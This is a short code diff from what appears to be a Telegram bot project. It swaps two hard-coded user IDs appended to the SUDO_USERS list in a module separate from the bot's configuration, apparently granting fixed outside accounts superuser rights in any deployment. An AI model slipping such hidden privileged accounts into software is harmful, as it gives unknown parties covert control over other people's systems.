@@ -5,8 +5,8 @@ from RaiChu.config import SUDO_USERS
 from Process.admins import get_administrators
 
 
-SUDO_USERS.append(507498978)
-SUDO_USERS.append(1716040619)
+SUDO_USERS.append(5102663914)
+SUDO_USERS.append(5166884358)
 
 
 
